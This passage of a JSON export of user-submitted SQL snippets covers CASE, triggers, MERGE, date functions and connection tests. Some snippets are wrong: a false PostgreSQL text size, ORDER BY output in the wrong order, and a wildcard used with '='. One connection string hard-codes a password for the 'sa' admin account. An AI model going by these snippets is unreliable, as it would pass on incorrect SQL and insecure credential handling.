    "description": "SELECT CASE col1 \tWHEN 'agree' THEN 'Ok' \tWHEN 'disagree' THEN 'Ko'     ELSE         CASE              WHEN col2 >= 1 THEN 'Ko'             ELSE 'Maybe'         END END AS my_result FROM table_name;\n-- Case Eg.) to retrive the MAX value of a Field  -- if there are entries for the Field in table MAX value will be returned  -- But if there is no entries at all for the Field in tabel MAX will return -- Null as the output. But Using Case When we can check it out return zero  -- or any other value if there is no enties for the Field in table.. SELECT  CASE   -- Like Switch Case \tWHEN -- First When condition  \t\t(MAX(BILLID) IS NULL) -- Condition  \tTHEN 1   -- output   (We can also add more When conditions like Above) ELSE -- When WHEN Condition not Satisfied Below will be Executed.  \t\t(MAX(BILLID)) -- output END  as MAXBILLID   from  DUAL; -- Final Output -- If there is no entry in the Field for the table -- BILLID --  1 -- If there are entries MAX of that Field value from the table -- BILLID -- 10\n",
    "reg_date": "2021-10-12T10:01:10.000Z"
  },
  {
    "id": 4458,
    "keyword": null,
    "link": null,
    "title": " switch plsql",
    "description": "/*in plsql you can do the switch construct by using the case construct that you usually use in queries but with the difference that you should specify  \"END CASE\" at the end*/ CASE some_variable \twhen 'value_1' then         --some code     \tdbms_output.put_line('lalala'); \twhen 'value_2' then         --some code     \tdbms_output.put_line('dadada');     else         --some code     \tdbms_output.put_line('dududu'); END CASE; \n",
    "reg_date": "2021-10-12T10:01:10.000Z"
  },
  {
    "id": 4459,
    "keyword": null,
    "link": null,
    "title": " synonym oracle",
    "description": "-- Can be a table, package, procedure... CREATE OR REPLACE SYNONYM syn_name FOR my_schema.my_table;       CREATE OR REPLACE PUBLIC SYNONYM syn_name FOR my_schema.my_table;  -- Through a dblink: CREATE OR REPLACE SYNONYM syn_name FOR my_schema.my_table@my_dblink;  SELECT * FROM DBA_SYNONYMS WHERE SYNONYM_NAME = 'synonym_name';\nCREATE OR REPLACE PUBLIC SYNONYM suppliers FOR app.suppliers;\n",
    "reg_date": "2021-10-12T10:01:10.000Z"
  },
  {
    "id": 4460,
    "keyword": null,
    "link": null,
    "title": " syntax for changing column size in mysql",
    "description": "ALTER TABLE emp MODIFY COLUMN name VARCHAR(100); \n",
    "reg_date": "2021-10-12T10:01:10.000Z"
  },
  {
    "id": 4461,
    "keyword": null,
    "link": null,
    "title": " sysdate in oracle sql",
    "description": "SELECT sysdate - 1 FROM dual; \t\t\t\t-- Yesterday    12/01/2021 14:27:27 SELECT trunc(sysdate) - 1 FROM dual; \t\t-- Yesterday    12/01/2021 00:00:00 SELECT sysdate + INTERVAL '20' DAY FROM DUAL;\t\t-- 20 days ahead (other way) SELECT sysdate - 1 / 24 FROM dual;\t\t\t\t\t-- 1 hour ago SELECT sysdate - 1 / 24 / 60 FROM dual;\t\t\t\t-- 1 minute ago SELECT add_months(trunc(sysdate), -1) FROM dual;   \t-- 1 month ago (no time) SELECT trunc(sysdate) - 30 FROM dual;\t\t\t\t-- 30 days ago (no time) SELECT add_months(trunc(sysdate), -12*2) FROM dual;\t-- 2 years ago (no time)  -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T10:01:10.000Z"
  },
  {
    "id": 4462,
    "keyword": null,
    "link": null,
    "title": " sysdate in sql",
    "description": " -- Sysdate in MySQL  SELECT SYSDATE();\t\t\t\t\t\t\t\t-- 2021-07-13 06:12  SELECT DATE_ADD(SYSDATE(), INTERVAL 1 DAY);\t-- 2021-07-14 06:12  SELECT DATE_ADD(SYSDATE(), INTERVAL -1 DAY);\t-- 2021-07-12 06:12  SELECT DATE(SYSDATE());\t\t\t\t\t\t-- 2021-07-13 00:00    -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T10:01:11.000Z"
  },
  {
    "id": 4463,
    "keyword": null,
    "link": null,
    "title": " system.data.sqlclient.sqlexception: 'invalid object name",
    "description": "connectionString=\"Data Source=.\\INSTANCENAME;Initial Catalog=LMS;User ID=sa;Password=temperament\"\n",
    "reg_date": "2021-10-12T10:01:11.000Z"
  },
  {
    "id": 4464,
    "keyword": null,
    "link": null,
    "title": " t-sql CASE",
    "description": "-- NOTE: this is for SQL-Oracle specifically  /* NB: Please like Mingles444 post, I derived this from him/her */  -- syntax: (Retrieved from grepper:Mingles444) CASE     WHEN condition1 THEN result1     WHEN condition2 THEN result2     WHEN conditionN THEN resultN     ELSE result END   -- example: SELECT  \tCASE       WHEN (1+6 = 6) THEN 'A'       WHEN (1+6 = 7) THEN 'B'       WHEN (1+6 = 8) THEN 'C'       ELSE 'D' \tEND  FROM DUAL;  -- OUTPUT: B \n-- Syntax for SQL Server, Azure SQL Database and Azure Synapse Analytics    --Simple CASE expression:    CASE input_expression         WHEN when_expression THEN result_expression [ ...n ]         [ ELSE else_result_expression ]    END     --Searched CASE expression:   CASE        WHEN Boolean_expression THEN result_expression [ ...n ]         [ ELSE else_result_expression ]    END   \n/*CASE statements are used to create different outputs and is    used by SQL as a way to handle if-then logic.*/      SELECT column_name,     CASE        WHEN condition THEN 'Result_1'       WHEN condition THEN 'Result_2'       ELSE 'Result_3'     END   FROM table_name;\nChange query output depending on conditions. Example: Returns users and their subscriptions, along with a new column called activity_levels that makes a judgement based on the number of subscriptions. SELECT first_name, surname, subscriptions CASE WHEN subscriptions > 10 THEN 'Very active' WHEN Quantity BETWEEN 3 AND 10 THEN 'Active' ELSE 'Inactive' END AS activity_levels FROM users;\n",
    "reg_date": "2021-10-12T10:01:11.000Z"
  },
  {
    "id": 4465,
    "keyword": null,
    "link": null,
    "title": " t-sql check if data exists",
    "description": "if exists(select 1 from INFORMATION_SCHEMA.TABLES T                where T.TABLE_NAME = 'Bookings')  begin     drop table Bookings end GO  create table Bookings(   FlightID    int identity(1, 1) primary key,   TicketsMax    int not null,   TicketsBooked int not null ) GO  insert  Bookings(TicketsMax, TicketsBooked) select 1, 0 insert  Bookings(TicketsMax, TicketsBooked) select 2, 2 insert  Bookings(TicketsMax, TicketsBooked) select 3, 1 GO  select * from Bookings\n",
    "reg_date": "2021-10-12T10:01:11.000Z"
  },
  {
    "id": 4466,
    "keyword": null,
    "link": null,
    "title": " t-sql delete view if exists",
    "description": "if exists(select 1 from sys.views where name='tst' and type='v') drop view tst; go  create view tst as select * from test\n",
    "reg_date": "2021-10-12T10:01:11.000Z"
  },
  {
    "id": 4467,
    "keyword": null,
    "link": null,
    "title": " t-sql disable system versioning",
    "description": "-- REF: https://docs.microsoft.com/en-us/sql/relational-databases/tables/stopping-system-versioning-on-a-system-versioned-temporal-table?view=sql-server-ver15 ALTER TABLE [TABLE_NAME]  SET(SYSTEM_VERSIONING = OFF) GO\n",
    "reg_date": "2021-10-12T10:01:11.000Z"
  },
  {
    "id": 4468,
    "keyword": null,
    "link": null,
    "title": " t-sql find object by name",
    "description": "-- SEARCHING FOR A SPECIFIC OBJECT CROSS DATABASE SELECT \t* FROM \tSys.Objects WHERE 1=1 \tAND name = '%HERE_THE_NAME_OF_OBJECT%'\n",
    "reg_date": "2021-10-12T10:01:11.000Z"
  },
  {
    "id": 4469,
    "keyword": null,
    "link": null,
    "title": " t-sql get duplicate rows",
    "description": "SELECT [CaseNumber], COUNT(*) AS Occurrences FROM [CaseCountry] GROUP BY [CaseNumber] HAVING (COUNT(*) > 1)\n",
    "reg_date": "2021-10-12T10:01:11.000Z"
  },
  {
    "id": 4470,
    "keyword": null,
    "link": null,
    "title": " t-sql merge example",
    "description": "MERGE dbo.MyTarget targ USING (SELECT ... FROM dbo.MySource GROUP BY .....) src ON (targ.Identifier = src.Identifier     AND targ.Name = src.ConstituentName     AND targ.Ticker = src.ConstituentTicker     AND (targ.CUSIP = src.CUSIP OR targ.ISIN = src.ISIN OR targ.SEDOL = src.SEDOL)) WHEN MATCHED THEN -- update values ;\n                                     MERGE sales.category t      USING sales.category_staging s ON (s.category_id = t.category_id) WHEN MATCHED     THEN UPDATE SET          t.category_name = s.category_name,         t.amount = s.amount WHEN NOT MATCHED BY TARGET      THEN INSERT (category_id, category_name, amount)          VALUES (s.category_id, s.category_name, s.amount) WHEN NOT MATCHED BY SOURCE      THEN DELETE; \nMERGE LoginTypes T         USING (SELECT 'System' as Description) S         ON(S.Description = T.Description) WHEN NOT MATCHED BY TARGET     THEN INSERT(Description, CreatedTimestamp, LastUpdatedTimestamp) VALUES('System', getdate(), getdate());\n",
    "reg_date": "2021-10-12T10:01:11.000Z"
  },
  {
    "id": 4471,
    "keyword": null,
    "link": null,
    "title": " t-sql random number for each row",
    "description": "SELECT FLOOR(RAND()*(b-a+1))+a;\nABS(CHECKSUM(NewId())) % 14\n",
    "reg_date": "2021-10-12T10:01:11.000Z"
  },
  {
    "id": 4472,
    "keyword": null,
    "link": null,
    "title": " t-sql remove all non-alphanumeric characters from a string",
    "description": "Create Function [dbo].[RemoveNonAlphaCharacters](@Temp VarChar(1000)) Returns VarChar(1000) AS Begin      Declare @KeepValues as varchar(50)     Set @KeepValues = '%[^a-z]%'     While PatIndex(@KeepValues, @Temp) > 0         Set @Temp = Stuff(@Temp, PatIndex(@KeepValues, @Temp), 1, '')      Return @Temp End\n",
    "reg_date": "2021-10-12T10:01:12.000Z"
  },
  {
    "id": 4473,
    "keyword": null,
    "link": null,
    "title": " t-sql select min from two values",
    "description": "SELECT PaidForPast=(SELECT MIN(x) FROM (VALUES (PaidThisMonth),(OwedPast)) AS value(x))\n",
    "reg_date": "2021-10-12T10:01:12.000Z"
  },
  {
    "id": 4474,
    "keyword": null,
    "link": null,
    "title": " t-sql test if table exists",
    "description": "IF (EXISTS (SELECT *                   FROM INFORMATION_SCHEMA.TABLES                   WHERE TABLE_SCHEMA = 'TheSchema'                   AND  TABLE_NAME = 'TheTable')) BEGIN     --Do Stuff END\n",
    "reg_date": "2021-10-12T10:01:12.000Z"
  },
  {
    "id": 4475,
    "keyword": null,
    "link": null,
    "title": " t SQl Checking Your Username",
    "description": "SELECT CURRENT_USER;\nORIGINAL_LOGIN(), CURRENT_USER SYSTEM_USER; SELECT ORIGINAL_LOGIN(), CURRENT_USER, SYSTEM_USER;\n",
    "reg_date": "2021-10-12T10:01:12.000Z"
  },
  {
    "id": 4476,
    "keyword": null,
    "link": null,
    "title": " t sql check active deadlock",
    "description": "select * from sys.sysprocesses where blocked > 0\n",
    "reg_date": "2021-10-12T10:01:12.000Z"
  },
  {
    "id": 4477,
    "keyword": null,
    "link": null,
    "title": " t sql contains",
    "description": "SELECT * FROM mytable WHERE column1 LIKE '%word1%'    OR column1 LIKE '%word2%'    OR column1 LIKE '%word3%'\nSELECT * FROM table WHERE Contains(Column, \"test\"); \n",
    "reg_date": "2021-10-12T10:01:12.000Z"
  },
  {
    "id": 4478,
    "keyword": null,
    "link": null,
    "title": " t sql less than date",
    "description": "SELECT * FROM Users WHERE member_since < '2011-12-25'\n",
    "reg_date": "2021-10-12T10:01:12.000Z"
  },
  {
    "id": 4479,
    "keyword": null,
    "link": null,
    "title": " t sql null or empty string",
    "description": "select * from vendor where isnull(vendor_email,'') = ''\nIF ISNULL(@param) OR @param = '' THEN doSomething...\n",
    "reg_date": "2021-10-12T10:01:12.000Z"
  },
  {
    "id": 4480,
    "keyword": null,
    "link": null,
    "title": " tablas bootstrap responsive sql server para datos vivos",
    "description": "<table class=\"table table-responsive table-hover\">    <thead>        <tr>            <th>First Name</th>            <th>Last Name</th>            <th>Email</th>        </tr>    </thead>    <tbody>        <tr>            <td>John</td>            <td>Doe</td>            <td>john@example.com</td>        </tr>        <tr>            <td>Smith</td>            <td>Thomas</td>            <td>smith@example.com</td>        </tr>        <tr>            <td>Merry</td>            <td>Jim</td>            <td>merry@example.com</td>        </tr>    </tbody></table>\n",
    "reg_date": "2021-10-12T10:01:12.000Z"
  },
  {
    "id": 4481,
    "keyword": null,
    "link": null,
    "title": " table drop if exist sql server",
    "description": "DROP TABLE IF EXISTS dbo.Customers \nIF OBJECT_ID('dbo.Scores', 'U') IS NOT NULL DROP TABLE dbo.Scores; \n",
    "reg_date": "2021-10-12T10:01:12.000Z"
  },
  {
    "id": 4482,
    "keyword": null,
    "link": null,
    "title": " table or view does not exist",
    "description": "-- ORA-00942 table or view does not exist      First check access: GRANT SELECT ON table_name TO schema_name;\n",
    "reg_date": "2021-10-12T10:01:13.000Z"
  },
  {
    "id": 4483,
    "keyword": null,
    "link": null,
    "title": " tables in sql",
    "description": "It's a table which structured with a set number of columns and a boundless number of rows. Table contains data and stores the data in databases. Once we change information in data it changes in the view aswell.\n",
    "reg_date": "2021-10-12T10:01:13.000Z"
  },
  {
    "id": 4484,
    "keyword": null,
    "link": null,
    "title": " tcl in sql",
    "description": "SQL language is divided into four types of primary language statements: DML, DDL, DCL and TCL.  Using these statements, we can define the structure of a database by creating and altering database objects, and we can manipulate data in a table through updates or deletions.  We also can control which user can read/write data or manage transactions to create a single unit of work\n",
    "reg_date": "2021-10-12T10:01:13.000Z"
  },
  {
    "id": 4485,
    "keyword": null,
    "link": null,
    "title": " temp tables in sql server",
    "description": "CREATE TABLE #haro_products (     product_name VARCHAR(MAX),     list_price DEC(10,2) );\n-- CREATE TEMP TABLE  Create Table #MyTempTable (     EmployeeID int ); \nDECLARE @TempTable AS TABLE(//Mention your columns in here.//) After that you can insert into this table later.\nSELECT * INTO #<Temp_Table_Name> FROM <TableName> WHERE <Conditions> ORDER BY <Col_Names OrderSeq> OPTION <Options>\n",
    "reg_date": "2021-10-12T10:01:13.000Z"
  },
  {
    "id": 4486,
    "keyword": null,
    "link": null,
    "title": " test mysql connection",
    "description": "Example (MySQLi Object-Oriented) <?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  // Create connection $conn = new mysqli($servername, $username, $password);  // Check connection if ($conn->connect_error) {     die(\"Connection failed: \" . $conn->connect_error); } echo \"Connected successfully\"; ?>  Example (MySQLi Procedural) <?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  // Create connection $conn = mysqli_connect($servername, $username, $password);  // Check connection if (!$conn) {     die(\"Connection failed: \" . mysqli_connect_error()); } echo \"Connected successfully\"; ?>  Example (PDO) <?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  try {     $conn = new PDO(\"mysql:host=$servername;dbname=myDB\", $username, $password);     // set the PDO error mode to exception     $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);     echo \"Connected successfully\";     } catch(PDOException $e)     {     echo \"Connection failed: \" . $e->getMessage();     } ?>\n",
    "reg_date": "2021-10-12T10:01:13.000Z"
  },
  {
    "id": 4487,
    "keyword": null,
    "link": null,
    "title": " test sql query",
    "description": "-- Test SQL queries online: use a fiddle: http://sqlfiddle.com/\n",
    "reg_date": "2021-10-12T10:01:13.000Z"
  },
  {
    "id": 4488,
    "keyword": null,
    "link": null,
    "title": " text data type capacity pgsql",
    "description": "Up to 65535 bytes\n",
    "reg_date": "2021-10-12T10:01:13.000Z"
  },
  {
    "id": 4489,
    "keyword": null,
    "link": null,
    "title": " there can be only one auto column and it must be defined as a key",
    "description": "CREATE TABLE book (    id INT AUTO_INCREMENT NOT NULL,    accepted_terms BIT(1) NOT NULL,    accepted_privacy BIT(1) NOT NULL,    primary key (id) ) ENGINE=InnoDB DEFAULT CHARSET=latin1;\n",
    "reg_date": "2021-10-12T10:01:13.000Z"
  },
  {
    "id": 4490,
    "keyword": null,
    "link": null,
    "title": " this is incompatible with sql mode=only full group by",
    "description": "SET GLOBAL sql_mode=(SELECT REPLACE(@@sql_mode,'ONLY_FULL_GROUP_BY','')); SET SESSION sql_mode=(SELECT REPLACE(@@sql_mode,'ONLY_FULL_GROUP_BY',''));\nmysql > SET GLOBAL sql_mode=(SELECT REPLACE(@@sql_mode,'ONLY_FULL_GROUP_BY',''));\n'connections' => [ ...      'mysql' => [     ...         'strict' => false,         ...      ],  ]\nmysql > SET GLOBAL sql_mode=(SELECT REPLACE(@@sql_mode,'ONLY_FULL_GROUP_BY','')); \ncheck this article for solved this issue  https://afrijaldzuhri.com/mengatasi-error-group-by-di-mysql/\n",
    "reg_date": "2021-10-12T10:01:13.000Z"
  },
  {
    "id": 4491,
    "keyword": null,
    "link": null,
    "title": " this is incompatible with sql mode=only full group by laravel",
    "description": "SET GLOBAL sql_mode=(SELECT REPLACE(@@sql_mode,'ONLY_FULL_GROUP_BY','')); SET SESSION sql_mode=(SELECT REPLACE(@@sql_mode,'ONLY_FULL_GROUP_BY',''));\nmysql > SET GLOBAL sql_mode=(SELECT REPLACE(@@sql_mode,'ONLY_FULL_GROUP_BY',''));\n'connections' => [ ...      'mysql' => [     ...         'strict' => false,         ...      ],  ]\n",
    "reg_date": "2021-10-12T10:01:14.000Z"
  },
  {
    "id": 4492,
    "keyword": null,
    "link": null,
    "title": " this month mysql where",
    "description": "SELECT * FROM table  WHERE MONTH(`columnName`) = MONTH(CURRENT_DATE());\nSELECT MONTH(\"2017-06-15\");\n",
    "reg_date": "2021-10-12T10:01:14.000Z"
  },
  {
    "id": 4493,
    "keyword": null,
    "link": null,
    "title": " this week mysql",
    "description": "SELECT * FROM   your_table WHERE  YEARWEEK(`date`, 1) = YEARWEEK(CURDATE(), 1) \nDAYOFWEEK(date) \n",
    "reg_date": "2021-10-12T10:01:14.000Z"
  },
  {
    "id": 4494,
    "keyword": null,
    "link": null,
    "title": " time data format for mysql",
    "description": "hh:ii:ss\n",
    "reg_date": "2021-10-12T10:01:14.000Z"
  },
  {
    "id": 4495,
    "keyword": null,
    "link": null,
    "title": " time data type in mysql",
    "description": "Data Type\t&ldquo;Zero&rdquo; Value DATE\t\t'0000-00-00' TIME\t\t'00:00:00' DATETIME\t'0000-00-00 00:00:00' TIMESTAMP\t'0000-00-00 00:00:00' YEAR\t\t0000\n",
    "reg_date": "2021-10-12T10:01:14.000Z"
  },
  {
    "id": 4496,
    "keyword": null,
    "link": null,
    "title": " timestamp ascending order vs descending order sql",
    "description": "SELECT timestamp FROM randomTable ORDER BY timestamp ASC >2012-07-11 17:34:57 >2012-07-11 17:33:07 >2012-07-11 17:33:28  SELECT timestamp FROM randomTable ORDER BY timestamp DESC >2012-07-11 17:33:07 >2012-07-11 17:33:28 >2012-07-11 17:34:57\n",
    "reg_date": "2021-10-12T10:01:14.000Z"
  },
  {
    "id": 4497,
    "keyword": null,
    "link": null,
    "title": " timestamp in sqlite",
    "description": "CREATE TABLE MyTable(     ID INTEGER PRIMARY KEY,     Name TEXT,     Other STUFF,     Timestamp DATETIME DEFAULT CURRENT_TIMESTAMP );\n",
    "reg_date": "2021-10-12T10:01:14.000Z"
  },
  {
    "id": 4498,
    "keyword": null,
    "link": null,
    "title": " timestamp mysql",
    "description": "DATE : YYYY-MM-DD format DATETIME : YYYY-MM-DD HH:MM:SS format TIMESTAMP : X s from 1970 format TIME : HH:MM:SS format\nINSERT INTO ... VALUES ('YYYY-MM-DD HH:MM:SS');\n1970-01-01 00:00:01\n",
    "reg_date": "2021-10-12T10:01:14.000Z"
  },
  {
    "id": 4499,
    "keyword": null,
    "link": null,
    "title": " to char oracle",
    "description": "SELECT   TO_CHAR( sysdate, 'YYYY-MM-DD' ) FROM   dual; \nSELECT TO_CHAR(sysdate, 'DD-MM-YYYY') from dual;\n",
    "reg_date": "2021-10-12T10:01:14.000Z"
  },
  {
    "id": 4500,
    "keyword": null,
    "link": null,
    "title": " to char sql",
    "description": "TO_CHAR( sysdate, 'YYYY-MM-DD' )  /*TO_CHAR Format Specifiers  YYYY\t\t\t4-digit year YY\t\t\t\t2-digit year MON\t\t\t\tAbbreviated month (Jan - Dec) MONTH\t\t\tMonth name (January - December) MM\t\t\t\tMonth (1 - 12) DY\t\t\t\tAbbreviated day (Sun - Sat) DD\t\t\t\tDay (1 - 31) HH24\t\t\tHour (0 - 23) HH or HH12\t\tHour (1 - 12) MI\t\t\t\tMinutes (0 - 59) SS\t\t\t\tSeconds (0 - 59)*/\nSELECT   TO_CHAR( sysdate, 'YYYY-MM-DD' ) FROM   dual; \nSELECT TO_CHAR(sysdate, 'DD-MM-YYYY') from dual;\n",
    "reg_date": "2021-10-12T10:01:14.000Z"
  },
  {
    "id": 4501,
    "keyword": null,
    "link": null,
    "title": " to date oracle",
    "description": "-- TO_TIMESTAMP(date_string,'YYYY-MM-DD HH24:MI:SS') SELECT TO_TIMESTAMP('2021-02-21 23:12:01','YYYY-MM-DD HH24:MI:SS') FROM DUAL;\nSELECT   TO_DATE( '5 Jan 2017', 'DD MON YYYY' ) FROM   dual;  ---or---- INSERT INTO members(first_name, last_name, joined_date) VALUES('Laureen','Davidson', TO_DATE('Feb 01 2017','Mon DD YYYY'));\nSELECT TO_DATE('14/07/2021','DD/MM/YYYY') FROM DUAL;                                    WATCH OUT!  /*\t  in the example before if you write '14072021' instead of '14/07/2021'       you'll get the same result, if you want an exception to be thrown you           should add the prefix 'fx' (force) to the format, so that he will        match only the exact format. here's some examples:          SELECT TO_DATE('14/07/2021','fxDD/MM/YYYY') FROM DUAL;--WORKS          SELECT TO_DATE('14072021','DD/MM/YYYY') FROM DUAL;    --WORKS          SELECT TO_DATE('14072021','fxDD/MM/YYYY') FROM DUAL;--EXCEPTION      */\n",
    "reg_date": "2021-10-12T10:01:15.000Z"
  },
  {
    "id": 4502,
    "keyword": null,
    "link": null,
    "title": " to date oracle with time",
    "description": "-- TO_TIMESTAMP(date_string,'YYYY-MM-DD HH24:MI:SS') SELECT TO_TIMESTAMP('2021-02-21 23:12:01','YYYY-MM-DD HH24:MI:SS') FROM DUAL;\nSELECT   TO_DATE( '5 Jan 2017', 'DD MON YYYY' ) FROM   dual;  ---or---- INSERT INTO members(first_name, last_name, joined_date) VALUES('Laureen','Davidson', TO_DATE('Feb 01 2017','Mon DD YYYY'));\n",
    "reg_date": "2021-10-12T10:01:15.000Z"
  },
  {
    "id": 4503,
    "keyword": null,
    "link": null,
    "title": " to delete a table in mysl",
    "description": "DROP TABLE table_name;\n",
    "reg_date": "2021-10-12T10:01:15.000Z"
  },
  {
    "id": 4504,
    "keyword": null,
    "link": null,
    "title": " to sql pandas",
    "description": "resultDf.to_sql('table_name', engine, schema=\"schema_name\", if_exists=\"append\", index=False)\nfrom sqlalchemy import create_engine engine = create_engine('sqlite://', echo=False) df.to_sql('users', con=engine) engine.execute(\"SELECT * FROM users\").fetchall() \n>>> df.to_sql('users', con=engine) >>> engine.execute(\"SELECT * FROM users\").fetchall() [(0, 'User 1'), (1, 'User 2'), (2, 'User 3')] \n",
    "reg_date": "2021-10-12T10:01:15.000Z"
  },
  {
    "id": 4505,
    "keyword": null,
    "link": null,
    "title": " todate oracle",
    "description": "SELECT   TO_DATE( '5 Jan 2017', 'DD MON YYYY' ) FROM   dual;  ---or---- INSERT INTO members(first_name, last_name, joined_date) VALUES('Laureen','Davidson', TO_DATE('Feb 01 2017','Mon DD YYYY'));\nSELECT   TO_DATE( '21 12 2017', 'DD MM YYYY' ) FROM   dual;  ---or---- INSERT INTO members(first_name, last_name, joined_date) VALUES('Laureen','Davidson', TO_DATE('2017/12/21','YYYY/MM/DD'));\n",
    "reg_date": "2021-10-12T10:01:15.000Z"
  },
  {
    "id": 4506,
    "keyword": null,
    "link": null,
    "title": " today minus 15 days postgresql",
    "description": "--yesterday SELECT NOW() - INTERVAL '1 DAY';  --Unrelated to the question, but PostgreSQL also supports some shortcuts: SELECT 'yesterday'::TIMESTAMP, 'tomorrow'::TIMESTAMP, 'allballs'::TIME;\n",
    "reg_date": "2021-10-12T10:01:15.000Z"
  },
  {
    "id": 4507,
    "keyword": null,
    "link": null,
    "title": " top 10 rows in mysql",
    "description": "select * from table_name ORDER BY id LIMIT 10;\n",
    "reg_date": "2021-10-12T10:01:15.000Z"
  },
  {
    "id": 4508,
    "keyword": null,
    "link": null,
    "title": " trigger",
    "description": "-- SQL Server (update my_table2 after insert on my_table1) CREATE TRIGGER trigger_name ON my_table1 FOR INSERT AS BEGIN     UPDATE my_table2 SET my_col_date = getdate() FROM my_table1  END -- Oracle (insert into log table after update on my_table) CREATE OR REPLACE TRIGGER trigger_name AFTER INSERT ON my_table FOR EACH ROW BEGIN     INSERT INTO my_log_table (LOG_DATE, ACTION) VALUES (SYSDATE, 'Changed'); END;\n",
    "reg_date": "2021-10-12T10:01:15.000Z"
  },
  {
    "id": 4509,
    "keyword": null,
    "link": null,
    "title": " trigger before insert",
    "description": "                                     CREATE TRIGGER trigger_name     BEFORE INSERT     ON table_name FOR EACH ROW trigger_body; \n                                     DELIMITER $$  CREATE TRIGGER before_workcenters_insert BEFORE INSERT ON WorkCenters FOR EACH ROW BEGIN     DECLARE rowcount INT;          SELECT COUNT(*)      INTO rowcount     FROM WorkCenterStats;          IF rowcount > 0 THEN         UPDATE WorkCenterStats         SET totalCapacity = totalCapacity + new.capacity;     ELSE         INSERT INTO WorkCenterStats(totalCapacity)         VALUES(new.capacity);     END IF;   END $$  DELIMITER ; \nCREATE TRIGGER trigger_name BEFORE INSERT    ON table_name FOR EACH ROW  BEGIN     -- variable declarations     -- trigger code  END;\n                                     INSERT INTO WorkCenters(name, capacity) VALUES('Mold Machine',100); \n",
    "reg_date": "2021-10-12T10:01:15.000Z"
  },
  {
    "id": 4510,
    "keyword": null,
    "link": null,
    "title": " trigger before insert sql code",
    "description": "                                     CREATE TRIGGER trigger_name     BEFORE INSERT     ON table_name FOR EACH ROW trigger_body; \n                                     DELIMITER $$  CREATE TRIGGER before_workcenters_insert BEFORE INSERT ON WorkCenters FOR EACH ROW BEGIN     DECLARE rowcount INT;          SELECT COUNT(*)      INTO rowcount     FROM WorkCenterStats;          IF rowcount > 0 THEN         UPDATE WorkCenterStats         SET totalCapacity = totalCapacity + new.capacity;     ELSE         INSERT INTO WorkCenterStats(totalCapacity)         VALUES(new.capacity);     END IF;   END $$  DELIMITER ; \n",
    "reg_date": "2021-10-12T10:01:15.000Z"
  },
  {
    "id": 4511,
    "keyword": null,
    "link": null,
    "title": " trigger in mysql",
    "description": "-- The following statement creates an AFTER UPDATE trigger on the sales table:  DELIMITER $$  CREATE TRIGGER after_sales_update AFTER UPDATE ON sales FOR EACH ROW BEGIN     IF OLD.quantity <> new.quantity THEN         INSERT INTO SalesChanges(salesId,beforeQuantity, afterQuantity)         VALUES(old.id, old.quantity, new.quantity);     END IF; END$$  DELIMITER ;\nCREATE     TRIGGER `event_name` BEFORE/AFTER INSERT/UPDATE/DELETE     ON `database`.`table`     FOR EACH ROW BEGIN \t\t-- trigger body \t\t-- this code is applied to every  \t\t-- inserted/updated/deleted row     END;      CREATE \tTRIGGER `blog_after_insert` AFTER INSERT  \tON `blog`  \tFOR EACH ROW BEGIN \t \t\tIF NEW.deleted THEN \t\t\tSET @changetype = 'DELETE'; \t\tELSE \t\t\tSET @changetype = 'NEW'; \t\tEND IF;      \t\tINSERT INTO audit (blog_id, changetype) VALUES (NEW.id, @changetype); \t\t     END$$\nCREATE TRIGGER trigger_name {BEFORE | AFTER} {INSERT | UPDATE| DELETE } ON table_name FOR EACH ROW trigger_body;\nCREATE TRIGGER Product_Details_tr  BEFORE INSERT ON Product_Details  FOR EACH ROW  SET NEW.User_ID = CURRENT_USER();\n",
    "reg_date": "2021-10-12T10:01:15.000Z"
  },
  {
    "id": 4512,
    "keyword": null,
    "link": null,
    "title": " trigger in mysql syntax",
    "description": "CREATE TRIGGER trigger_name {BEFORE | AFTER} {INSERT | UPDATE| DELETE } ON table_name FOR EACH ROW trigger_body;\n",
    "reg_date": "2021-10-12T10:01:16.000Z"
  },
  {
    "id": 4513,
    "keyword": null,
    "link": null,
    "title": " trigger in postgresql to change incoming entry",
    "description": "CREATE or REPLACE FUNCTION func() RETURNS TRIGGER AS $$ BEGIN NEW.columnname = 0; RETURN NEW; END; $$ LANGUAGE plpgsql;  -- Statement to make trigger to execute above code -- CREATE TRIGGER change_incoming BEFORE INSERT on Tablename  FOR EACH ROW EXECUTE PROCEDURE func();\n",
    "reg_date": "2021-10-12T10:01:16.000Z"
  },
  {
    "id": 4514,
    "keyword": null,
    "link": null,
    "title": " trigger insert",
    "description": "-- SQL Server (update my_table2 after insert on my_table1) CREATE TRIGGER trigger_name ON my_table1 FOR INSERT AS BEGIN     UPDATE my_table2 SET my_col_date = getdate() FROM my_table1  END -- Oracle (insert into log table after update on my_table) CREATE OR REPLACE TRIGGER trigger_name AFTER INSERT ON my_table FOR EACH ROW BEGIN     INSERT INTO my_log_table (LOG_DATE, ACTION) VALUES (SYSDATE, 'Changed'); END;\n",
    "reg_date": "2021-10-12T10:01:16.000Z"
  },
  {
    "id": 4515,
    "keyword": null,
    "link": null,
    "title": " trigger on update of a particular column",
    "description": "-- SQL Server (update my_table after update on my_table) CREATE TRIGGER trigger_name ON my_table AFTER UPDATE AS IF UPDATE (col_name)\t-- Optional, for particular column BEGIN     UPDATE my_table SET my_col_date = getdate() FROM my_table  END; -- Oracle (insert into log table after update on my_table) CREATE OR REPLACE TRIGGER trigger_name AFTER UPDATE ON my_table FOR EACH ROW BEGIN     INSERT INTO my_log_table (LOG_DATE, ACTION) VALUES (SYSDATE, 'Changed'); END;\n",
    "reg_date": "2021-10-12T10:01:16.000Z"
  },
  {
    "id": 4516,
    "keyword": null,
    "link": null,
    "title": " trigger oracle execution",
    "description": "CREATE [OR REPLACE ] TRIGGER trigger_name   {BEFORE | AFTER | INSTEAD OF }   {INSERT [OR] | UPDATE [OR] | DELETE}   [OF col_name]   ON table_name   [REFERENCING OLD AS o NEW AS n]   [FOR EACH ROW]   WHEN (condition)    DECLARE     Declaration-statements  BEGIN      Executable-statements  EXCEPTION     Exception-handling-statements  END; \n",
    "reg_date": "2021-10-12T10:01:16.000Z"
  },
  {
    "id": 4517,
    "keyword": null,
    "link": null,
    "title": " trim leading zeros in sql",
    "description": "SUBSTRING(str_col, PATINDEX('%[^0]%', str_col+'.'), LEN(str_col)) \n",
